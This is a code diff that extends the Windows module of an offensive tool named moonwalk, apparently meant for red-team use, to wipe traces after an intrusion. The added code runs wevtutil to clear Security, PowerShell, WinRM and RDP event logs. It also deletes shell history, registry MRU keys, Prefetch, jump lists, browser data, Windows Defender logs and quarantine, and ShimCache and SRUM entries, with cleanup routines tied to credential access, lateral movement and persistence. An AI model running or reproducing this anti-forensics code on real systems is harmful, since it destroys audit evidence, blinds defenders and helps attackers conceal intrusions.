@@ -212,7 +212,15 @@ class LogHunter:
 
 
 class WindowsMoonwalk:
-    """Windows version of moonwalk - Cover tracks and clear logs"""
+    """
+    Windows-native equivalent of moonwalk - Cover tracks using Windows-native tools
+    
+    Unlike Linux moonwalk which clears bash history and syslog, this uses:
+    - wevtutil for Windows Event Logs
+    - PowerShell cmdlets for Windows-specific artifacts
+    - reg.exe for registry cleanup
+    - Windows-native file system locations
+    """
     
     def __init__(self, console: Console, session_data: dict):
         self.console = console
@@ -223,16 +231,28 @@ class WindowsMoonwalk:
     
     def clear_event_logs(self, log_names: Optional[List[str]] = None) -> Dict[str, Any]:
         """
-        Clear Windows event logs
+        Clear Windows Event Logs using wevtutil.exe (Windows-native tool)
+        
+        Equivalent to Linux: clearing /var/log/* files
+        Windows uses: wevtutil.exe cl <LogName>
         
         Args:
-            log_names: List of log names to clear (default: Security, System, Application)
+            log_names: List of log names to clear (default: common security-relevant logs)
         
         Returns:
             Dictionary with results
         """
         if log_names is None:
-            log_names = ['Security', 'System', 'Application', 'PowerShell']
+            # Windows Event Logs (not Linux syslog equivalents)
+            log_names = [
+                'Security',           # Windows security events
+                'System',             # System events
+                'Application',        # Application events
+                'Microsoft-Windows-PowerShell/Operational',  # PowerShell execution logs
+                'Windows PowerShell', # Legacy PowerShell logs
+                'Microsoft-Windows-WinRM/Operational',  # WinRM logs
+                'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational',  # RDP logs
+            ]
         
         results = {
             'cleared': [],
@@ -242,7 +262,8 @@ class WindowsMoonwalk:
         
         for log_name in log_names:
             try:
-                cmd = f'wevtutil.exe cl {log_name}'
+                # Use Windows Event Log utility (wevtutil.exe)
+                cmd = f'wevtutil.exe cl "{log_name}"'
                 exit_code, stdout, stderr = execute_cmd(cmd, lab_use=self.lab_use)
                 
                 if exit_code == 0:
@@ -250,6 +271,7 @@ class WindowsMoonwalk:
                     results['commands'].append(cmd)
                     self.cleared_logs.append(log_name)
                 else:
+                    # Some logs may not exist or require admin privileges
                     results['failed'].append({'log': log_name, 'error': stderr})
             
             except Exception as e:
@@ -258,14 +280,36 @@ class WindowsMoonwalk:
         return results
     
     def clear_powershell_history(self) -> bool:
-        """Clear PowerShell command history"""
+        """
+        Clear PowerShell command history (Windows equivalent of .bash_history)
+        
+        Linux: ~/.bash_history
+        Windows: PSReadline history file (typically in AppData)
+        """
         try:
-            # Clear PSReadline history
-            ps_cmd = 'Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue'
+            # Get PSReadline history file path (Windows-specific location)
+            ps_cmd = '''
+            $historyPath = (Get-PSReadlineOption).HistorySavePath
+            if ($historyPath -and (Test-Path $historyPath)) {
+                Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
+            }
+            # Also clear in-memory history
+            Clear-History -ErrorAction SilentlyContinue
+            '''
             execute_powershell(ps_cmd, lab_use=self.lab_use)
             
-            # Clear console history
-            ps_cmd = 'Clear-Host'
+            # Clear all user PowerShell history files (multiple locations)
+            ps_cmd = '''
+            $paths = @(
+                "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
+                "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+            )
+            foreach ($path in $paths) {
+                if (Test-Path $path) {
+                    Remove-Item $path -Force -ErrorAction SilentlyContinue
+                }
+            }
+            '''
             execute_powershell(ps_cmd, lab_use=self.lab_use)
             
             return True
@@ -273,18 +317,40 @@ class WindowsMoonwalk:
             return False
     
     def clear_command_history(self) -> bool:
-        """Clear command prompt history"""
+        """
+        Clear Windows Command Prompt history
+        
+        Linux: ~/.bash_history
+        Windows: doskey history (stored in registry and memory)
+        """
         try:
-            # Clear doskey history (if available)
+            # Clear doskey history from registry (Windows-specific)
+            reg_cmd = 'reg delete "HKCU\\Software\\Microsoft\\Command Processor" /v "CompletionChar" /f 2>nul'
+            execute_cmd(reg_cmd, lab_use=self.lab_use)
+            
+            # Clear doskey macros/history
             cmd = 'doskey /reinstall'
             execute_cmd(cmd, lab_use=self.lab_use)
+            
+            # Clear Windows command history from registry
+            ps_cmd = '''
+            $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
+            if (Test-Path $regPath) {
+                Remove-ItemProperty -Path $regPath -Name "*" -ErrorAction SilentlyContinue
+            }
+            '''
+            execute_powershell(ps_cmd, lab_use=self.lab_use)
+            
             return True
         except Exception:
             return False
     
     def remove_file_timestamps(self, file_path: str) -> bool:
         """
-        Remove file timestamps (modify to current time)
+        Modify file timestamps to current time (Windows equivalent of touch)
+        
+        Linux: touch command
+        Windows: PowerShell Set-ItemProperty or .NET FileInfo properties
         
         Args:
             file_path: Path to file
@@ -293,8 +359,16 @@ class WindowsMoonwalk:
             Success status
         """
         try:
-            # Use PowerShell to touch file (update timestamp)
-            ps_cmd = f'(Get-Item "{file_path}").LastWriteTime = Get-Date'
+            # Use PowerShell to modify all timestamps (Windows-native)
+            ps_cmd = f'''
+            $file = Get-Item "{file_path}" -ErrorAction SilentlyContinue
+            if ($file) {{
+                $now = Get-Date
+                $file.CreationTime = $now
+                $file.LastWriteTime = $now
+                $file.LastAccessTime = $now
+            }}
+            '''
             exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
             return exit_code == 0
         except Exception:
@@ -302,19 +376,33 @@ class WindowsMoonwalk:
     
     def clear_registry_traces(self, keys: Optional[List[str]] = None) -> Dict[str, Any]:
         """
-        Clear registry traces
+        Clear Windows Registry traces (Windows-specific artifact storage)
+        
+        Linux: No direct equivalent - uses filesystem
+        Windows: Registry stores user activity, run commands, typed paths, etc.
         
         Args:
-            keys: List of registry keys to clear (default: common traces)
+            keys: List of registry keys to clear (default: common Windows traces)
         
         Returns:
             Dictionary with results
         """
         if keys is None:
+            # Windows Registry locations (not Linux equivalents)
             keys = [
+                # Run dialog history
                 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU',
+                # Typed paths in Explorer
                 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths',
+                # Search history
                 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery',
+                # Recent documents
+                'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs',
+                # Last visited MRU (Most Recently Used)
+                'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedMRU',
+                'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSaveMRU',
+                # Windows Timeline (Windows 10+)
+                'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\CloudStore\\Store\\Cache\\DefaultAccount',
             ]
         
         results = {
@@ -324,11 +412,21 @@ class WindowsMoonwalk:
         
         for key in keys:
             try:
-                # Delete registry values
-                cmd = f'reg delete "{key}" /f'
+                # Use Windows reg.exe utility
+                cmd = f'reg delete "{key}" /f 2>nul'
                 exit_code, stdout, stderr = execute_cmd(cmd, lab_use=self.lab_use)
                 
-                if exit_code == 0:
+                # Also try PowerShell method for better control
+                ps_key = key.replace('HKCU\\', 'HKCU:\\').replace('HKLM\\', 'HKLM:\\')
+                ps_cmd = f'''
+                $regPath = "{ps_key}"
+                if (Test-Path $regPath) {{
+                    Remove-ItemProperty -Path $regPath -Name "*" -ErrorAction SilentlyContinue
+                }}
+                '''
+                execute_powershell(ps_cmd, lab_use=self.lab_use)
+                
+                if exit_code == 0 or exit_code == 1:  # 1 = key not found, which is fine
                     results['cleared'].append(key)
                 else:
                     results['failed'].append({'key': key, 'error': stderr})
@@ -339,23 +437,69 @@ class WindowsMoonwalk:
         return results
     
     def clear_prefetch(self) -> bool:
-        """Clear Windows Prefetch files"""
+        """
+        Clear Windows Prefetch files (Windows-specific performance optimization cache)
+        
+        Linux: No direct equivalent
+        Windows: C:\\Windows\\Prefetch\\ - stores application execution traces
+        """
         try:
-            ps_cmd = 'Remove-Item C:\\Windows\\Prefetch\\* -Force -ErrorAction SilentlyContinue'
+            # Clear Prefetch directory (Windows-specific location)
+            ps_cmd = '''
+            $prefetchPath = "$env:SystemRoot\\Prefetch"
+            if (Test-Path $prefetchPath) {
+                Get-ChildItem $prefetchPath -File | Remove-Item -Force -ErrorAction SilentlyContinue
+            }
+            '''
             exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
             return exit_code == 0
         except Exception:
             return False
     
     def clear_recent_files(self) -> bool:
-        """Clear recent files"""
+        """
+        Clear Windows Recent Files and Jump Lists (Windows-specific user activity tracking)
+        
+        Linux: ~/.recently-used, ~/.local/share/recently-used.xbel
+        Windows: Recent folder, Jump Lists, LNK files
+        """
         try:
-            # Clear recent documents
-            ps_cmd = 'Remove-Item "$env:APPDATA\\Microsoft\\Windows\\Recent\\*" -Force -ErrorAction SilentlyContinue'
+            # Clear Recent Documents (Windows-specific location)
+            ps_cmd = '''
+            $recentPaths = @(
+                "$env:APPDATA\Microsoft\Windows\Recent\*",
+                "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*",
+                "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*"
+            )
+            foreach ($path in $recentPaths) {
+                if (Test-Path $path) {
+                    Remove-Item $path -Force -Recurse -ErrorAction SilentlyContinue
+                }
+            }
+            '''
             execute_powershell(ps_cmd, lab_use=self.lab_use)
             
-            # Clear jump lists
-            ps_cmd = 'Remove-Item "$env:APPDATA\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\*" -Force -ErrorAction SilentlyContinue'
+            # Clear Jump Lists (Windows 7+ feature)
+            ps_cmd = '''
+            $jumpListPath = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
+            if (Test-Path $jumpListPath) {
+                Get-ChildItem $jumpListPath | Remove-Item -Force -ErrorAction SilentlyContinue
+            }
+            '''
+            execute_powershell(ps_cmd, lab_use=self.lab_use)
+            
+            # Clear LNK files (Windows shortcut files)
+            ps_cmd = '''
+            $lnkPaths = @(
+                "$env:APPDATA\Microsoft\Windows\SendTo",
+                "$env:APPDATA\Microsoft\Windows\Start Menu"
+            )
+            foreach ($path in $lnkPaths) {
+                if (Test-Path $path) {
+                    Get-ChildItem $path -Recurse -Filter *.lnk | Remove-Item -Force -ErrorAction SilentlyContinue
+                }
+            }
+            '''
             execute_powershell(ps_cmd, lab_use=self.lab_use)
             
             return True
@@ -363,36 +507,64 @@ class WindowsMoonwalk:
             return False
     
     def clear_temp_files(self) -> bool:
-        """Clear temporary files"""
+        """
+        Clear Windows temporary files (Windows-specific temp locations)
+        
+        Linux: /tmp, /var/tmp
+        Windows: %TEMP%, %TMP%, Windows\\Temp, LocalAppData\\Temp
+        """
         try:
-            temp_dirs = [
-                '$env:TEMP',
-                '$env:TMP',
-                'C:\\Windows\\Temp',
-                '$env:LOCALAPPDATA\\Temp'
-            ]
-            
-            for temp_dir in temp_dirs:
-                ps_cmd = f'Remove-Item "{temp_dir}\\*" -Recurse -Force -ErrorAction SilentlyContinue'
-                execute_powershell(ps_cmd, lab_use=self.lab_use)
+            # Windows temporary directories (not Linux /tmp equivalents)
+            ps_cmd = '''
+            $tempDirs = @(
+                $env:TEMP,
+                $env:TMP,
+                "$env:SystemRoot\Temp",
+                "$env:LOCALAPPDATA\Temp",
+                "$env:LOCALAPPDATA\Microsoft\Windows\INetCache",
+                "$env:LOCALAPPDATA\Microsoft\Windows\IECompatCache",
+                "$env:LOCALAPPDATA\Microsoft\Windows\IECompatUACache"
+            )
+            foreach ($dir in $tempDirs) {
+                if (Test-Path $dir) {
+                    Get-ChildItem $dir -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
+                }
+            }
+            '''
+            execute_powershell(ps_cmd, lab_use=self.lab_use)
             
             return True
         except Exception:
             return False
     
     def clear_browser_history(self, browser: str = 'all') -> Dict[str, Any]:
-        """Clear browser history"""
+        """
+        Clear browser history (Windows-specific browser data locations)
+        
+        Linux: ~/.mozilla, ~/.config/google-chrome, etc.
+        Windows: AppData\\Local\\Google\\Chrome, AppData\\Local\\Microsoft\\Edge, etc.
+        """
         browsers = {
             'chrome': [
                 '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History',
-                '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies'
+                '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies',
+                '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cache',
+                '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Web Data'
             ],
             'edge': [
                 '$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\History',
-                '$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Cookies'
+                '$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Cookies',
+                '$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Cache',
+                '$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Web Data'
             ],
             'firefox': [
-                '$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*\\places.sqlite'
+                '$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*\\places.sqlite',
+                '$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite',
+                '$env:LOCALAPPDATA\\Mozilla\\Firefox\\Profiles\\*\\cache2'
+            ],
+            'ie': [
+                '$env:LOCALAPPDATA\\Microsoft\\Windows\\INetCache',
+                '$env:LOCALAPPDATA\\Microsoft\\Windows\\INetCookies'
             ]
         }
         
@@ -407,7 +579,12 @@ class WindowsMoonwalk:
         
         for target in targets:
             try:
-                ps_cmd = f'Remove-Item "{target}" -Force -ErrorAction SilentlyContinue'
+                ps_cmd = f'''
+                $path = "{target}"
+                if (Test-Path $path) {{
+                    Remove-Item $path -Force -Recurse -ErrorAction SilentlyContinue
+                }}
+                '''
                 exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
                 if exit_code == 0:
                     results['cleared'].append(target)
@@ -416,8 +593,149 @@ class WindowsMoonwalk:
         
         return results
     
+    def clear_windows_defender_logs(self) -> Dict[str, Any]:
+        """
+        Clear Windows Defender logs and quarantine (Windows-specific security logs)
+        
+        Linux: No direct equivalent (depends on AV solution)
+        Windows: Windows Defender logs, quarantine, scan history
+        """
+        results = {'cleared': [], 'failed': []}
+        
+        try:
+            # Clear Windows Defender logs
+            ps_cmd = '''
+            $defenderLogs = @(
+                "$env:ProgramData\Microsoft\Windows Defender\Support\*.log",
+                "$env:ProgramData\Microsoft\Windows Defender\Scans\*.log",
+                "$env:ProgramData\Microsoft\Windows Defender\Support\MPLog-*.log"
+            )
+            foreach ($pattern in $defenderLogs) {
+                Get-ChildItem $pattern -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+            }
+            '''
+            execute_powershell(ps_cmd, lab_use=self.lab_use)
+            results['cleared'].append('Windows Defender logs')
+            
+            # Clear Windows Defender quarantine (if accessible)
+            ps_cmd = '''
+            $quarantinePath = "$env:ProgramData\Microsoft\Windows Defender\Quarantine"
+            if (Test-Path $quarantinePath) {
+                Get-ChildItem $quarantinePath -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
+            }
+            '''
+            execute_powershell(ps_cmd, lab_use=self.lab_use)
+            results['cleared'].append('Windows Defender quarantine')
+        
+        except Exception as e:
+            results['failed'].append({'item': 'Windows Defender', 'error': str(e)})
+        
+        return results
+    
+    def clear_windows_artifacts(self) -> Dict[str, Any]:
+        """
+        Clear Windows-specific forensic artifacts
+        
+        Linux: No direct equivalents
+        Windows: Thumbnail cache, Recycle Bin, Windows Search index, etc.
+        """
+        results = {'cleared': [], 'failed': []}
+        
+        try:
+            # Clear Thumbnail Cache (Windows-specific)
+            ps_cmd = '''
+            $thumbCache = "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db"
+            Get-ChildItem $thumbCache -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+            '''
+            execute_powershell(ps_cmd, lab_use=self.lab_use)
+            results['cleared'].append('Thumbnail cache')
+            
+            # Clear Recycle Bin (Windows-specific)
+            ps_cmd = '''
+            Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+            '''
+            execute_powershell(ps_cmd, lab_use=self.lab_use)
+            results['cleared'].append('Recycle Bin')
+            
+            # Clear Windows Search history
+            ps_cmd = '''
+            $searchPath = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
+            if (Test-Path $searchPath) {
+                Get-ChildItem $searchPath | Remove-Item -Force -ErrorAction SilentlyContinue
+            }
+            '''
+            execute_powershell(ps_cmd, lab_use=self.lab_use)
+            results['cleared'].append('Windows Search history')
+            
+            # Clear Windows Error Reporting (WER) logs
+            ps_cmd = '''
+            $werPath = "$env:LOCALAPPDATA\Microsoft\Windows\WER"
+            if (Test-Path $werPath) {
+                Get-ChildItem $werPath -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
+            }
+            '''
+            execute_powershell(ps_cmd, lab_use=self.lab_use)
+            results['cleared'].append('Windows Error Reporting logs')
+            
+            # Clear Windows Update logs
+            ps_cmd = '''
+            $updateLogs = "$env:SystemRoot\Logs\WindowsUpdate"
+            if (Test-Path $updateLogs) {
+                Get-ChildItem $updateLogs -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+            }
+            '''
+            execute_powershell(ps_cmd, lab_use=self.lab_use)
+            results['cleared'].append('Windows Update logs')
+        
+        except Exception as e:
+            results['failed'].append({'item': 'Windows artifacts', 'error': str(e)})
+        
+        return results
+    
+    def clear_application_compatibility_cache(self) -> Dict[str, Any]:
+        """
+        Clear Application Compatibility Cache (ShimCache) and Amcache
+        
+        Linux: No direct equivalent
+        Windows: ShimCache, Amcache - store execution history
+        """
+        results = {'cleared': [], 'failed': []}
+        
+        try:
+            # Clear Amcache (Windows 7+)
+            ps_cmd = '''
+            $amcachePath = "$env:SystemRoot\AppCompat\Programs\Amcache.hve"
+            if (Test-Path $amcachePath) {
+                # Note: This file is locked by Windows, may require system restart
+                # Attempt to clear registry references instead
+                reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" /f 2>$null
+            }
+            '''
+            execute_powershell(ps_cmd, lab_use=self.lab_use)
+            results['cleared'].append('Amcache references')
+            
+            # Clear SRUM (System Resource Usage Monitor) database
+            ps_cmd = '''
+            $srumPath = "$env:SystemRoot\System32\sru"
+            if (Test-Path $srumPath) {
+                # SRUM database is locked, but we can try to clear related registry entries
+                reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SRUM" /f 2>$null
+            }
+            '''
+            execute_powershell(ps_cmd, lab_use=self.lab_use)
+            results['cleared'].append('SRUM references')
+        
+        except Exception as e:
+            results['failed'].append({'item': 'Application compatibility cache', 'error': str(e)})
+        
+        return results
+    
     def full_cleanup(self) -> Dict[str, Any]:
-        """Perform full cleanup (moonwalk)"""
+        """
+        Perform full Windows-native cleanup (equivalent to Linux moonwalk)
+        
+        Uses Windows-native tools and locations, not Linux ported concepts
+        """
         results = {
             'event_logs': self.clear_event_logs(),
             'powershell_history': self.clear_powershell_history(),
@@ -426,14 +744,17 @@ class WindowsMoonwalk:
             'prefetch': self.clear_prefetch(),
             'recent_files': self.clear_recent_files(),
             'temp_files': self.clear_temp_files(),
-            'browser_history': self.clear_browser_history('all')
+            'browser_history': self.clear_browser_history('all'),
+            'windows_defender': self.clear_windows_defender_logs(),
+            'windows_artifacts': self.clear_windows_artifacts(),
+            'app_compatibility': self.clear_application_compatibility_cache()
         }
         
         return results
     
     def cleanup_after_operation(self, operation_type: str) -> Dict[str, Any]:
         """
-        Cleanup after specific operation type
+        Cleanup after specific operation type using Windows-native methods
         
         Args:
             operation_type: Type of operation (credential_access, lateral_movement, etc.)
@@ -444,28 +765,44 @@ class WindowsMoonwalk:
         results = {}
         
         if operation_type == 'credential_access':
-            # Clear Security log, PowerShell history
-            results['event_logs'] = self.clear_event_logs(['Security', 'PowerShell'])
+            # Clear Security log (Windows Event Log), PowerShell history (Windows-specific)
+            results['event_logs'] = self.clear_event_logs([
+                'Security',
+                'Microsoft-Windows-PowerShell/Operational',
+                'Windows PowerShell'
+            ])
             results['powershell_history'] = self.clear_powershell_history()
+            results['registry_traces'] = self.clear_registry_traces()  # Clear typed paths, etc.
         
         elif operation_type == 'lateral_movement':
-            # Clear Security log, command history
-            results['event_logs'] = self.clear_event_logs(['Security'])
+            # Clear Security log (Windows Event Log), command history (Windows-specific)
+            results['event_logs'] = self.clear_event_logs([
+                'Security',
+                'Microsoft-Windows-WinRM/Operational',
+                'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational'
+            ])
             results['command_history'] = self.clear_command_history()
             results['registry_traces'] = self.clear_registry_traces()
+            results['recent_files'] = self.clear_recent_files()  # Clear Jump Lists, LNK files
         
         elif operation_type == 'execution':
-            # Clear Application log, PowerShell history
-            results['event_logs'] = self.clear_event_logs(['Application', 'PowerShell'])
+            # Clear Application log (Windows Event Log), PowerShell history (Windows-specific)
+            results['event_logs'] = self.clear_event_logs([
+                'Application',
+                'Microsoft-Windows-PowerShell/Operational',
+                'Windows PowerShell'
+            ])
             results['powershell_history'] = self.clear_powershell_history()
+            results['prefetch'] = self.clear_prefetch()  # Clear Prefetch (Windows-specific)
         
         elif operation_type == 'persistence':
-            # Clear System log, registry traces
+            # Clear System log (Windows Event Log), registry traces (Windows-specific)
             results['event_logs'] = self.clear_event_logs(['System'])
             results['registry_traces'] = self.clear_registry_traces()
+            results['windows_artifacts'] = self.clear_windows_artifacts()  # Clear Windows-specific artifacts
         
         else:
-            # Default: clear all
+            # Default: full Windows-native cleanup
             results = self.full_cleanup()
         
         return results
@@ -650,21 +987,24 @@ class MoonwalkModule:
             table.add_column("Option", style="cyan", width=3)
             table.add_column("Function", style="white")
             
-            table.add_row("1", "Clear Event Logs")
+            table.add_row("1", "Clear Event Logs (wevtutil)")
             table.add_row("2", "Clear PowerShell History")
             table.add_row("3", "Clear Command History")
             table.add_row("4", "Clear Registry Traces")
             table.add_row("5", "Clear Prefetch Files")
-            table.add_row("6", "Clear Recent Files")
+            table.add_row("6", "Clear Recent Files & Jump Lists")
             table.add_row("7", "Clear Temp Files")
             table.add_row("8", "Clear Browser History")
-            table.add_row("9", "Full Cleanup (Moonwalk)")
+            table.add_row("9", "Clear Windows Defender Logs")
+            table.add_row("10", "Clear Windows Artifacts (Thumbnails, WER, etc.)")
+            table.add_row("11", "Clear Application Compatibility Cache")
+            table.add_row("12", "Full Cleanup (Windows Moonwalk)")
             table.add_row("0", "Return to main menu")
             
             console.print(table)
             console.print()
             
-            choice = Prompt.ask("Select function", choices=['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'], default='0')
+            choice = Prompt.ask("Select function", choices=['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12'], default='0')
             
             if choice == '0':
                 break
@@ -685,6 +1025,12 @@ class MoonwalkModule:
             elif choice == '8':
                 self._clear_browser(console)
             elif choice == '9':
+                self._clear_defender(console)
+            elif choice == '10':
+                self._clear_artifacts(console)
+            elif choice == '11':
+                self._clear_appcompat(console)
+            elif choice == '12':
                 self._full_cleanup(console)
             
             console.print()
@@ -819,4 +1165,53 @@ class MoonwalkModule:
             if results.get('browser_history', {}).get('cleared'):
                 console.print(f"Browser History: {len(results['browser_history']['cleared'])} items cleared")
             
-            console.print("\n[green]Full cleanup complete[/green]")
+            if results.get('windows_defender', {}).get('cleared'):
+                console.print(f"Windows Defender: {len(results['windows_defender']['cleared'])} items cleared")
+            
+            if results.get('windows_artifacts', {}).get('cleared'):
+                console.print(f"Windows Artifacts: {len(results['windows_artifacts']['cleared'])} items cleared")
+            
+            if results.get('app_compatibility', {}).get('cleared'):
+                console.print(f"Application Compatibility Cache: {len(results['app_compatibility']['cleared'])} items cleared")
+            
+            console.print("\n[green]Full Windows-native cleanup complete[/green]")
+    
+    def _clear_defender(self, console: Console):
+        """Clear Windows Defender logs"""
+        console.print("\n[bold cyan]Clear Windows Defender Logs[/bold cyan]\n")
+        
+        results = self.moonwalk.clear_windows_defender_logs()
+        
+        console.print(f"\n[green]Cleared:[/green] {len(results['cleared'])} items")
+        for item in results['cleared']:
+            console.print(f"  • {item}")
+        
+        if results['failed']:
+            console.print(f"\n[yellow]Failed:[/yellow] {len(results['failed'])} items")
+    
+    def _clear_artifacts(self, console: Console):
+        """Clear Windows artifacts"""
+        console.print("\n[bold cyan]Clear Windows Artifacts[/bold cyan]\n")
+        
+        results = self.moonwalk.clear_windows_artifacts()
+        
+        console.print(f"\n[green]Cleared:[/green] {len(results['cleared'])} items")
+        for item in results['cleared']:
+            console.print(f"  • {item}")
+        
+        if results['failed']:
+            console.print(f"\n[yellow]Failed:[/yellow] {len(results['failed'])} items")
+    
+    def _clear_appcompat(self, console: Console):
+        """Clear application compatibility cache"""
+        console.print("\n[bold cyan]Clear Application Compatibility Cache[/bold cyan]\n")
+        
+        if Confirm.ask("[bold yellow]Clear Amcache and SRUM references?[/bold yellow]", default=False):
+            results = self.moonwalk.clear_application_compatibility_cache()
+            
+            console.print(f"\n[green]Cleared:[/green] {len(results['cleared'])} items")
+            for item in results['cleared']:
+                console.print(f"  • {item}")
+            
+            if results['failed']:
+                console.print(f"\n[yellow]Failed:[/yellow] {len(results['failed'])} items")
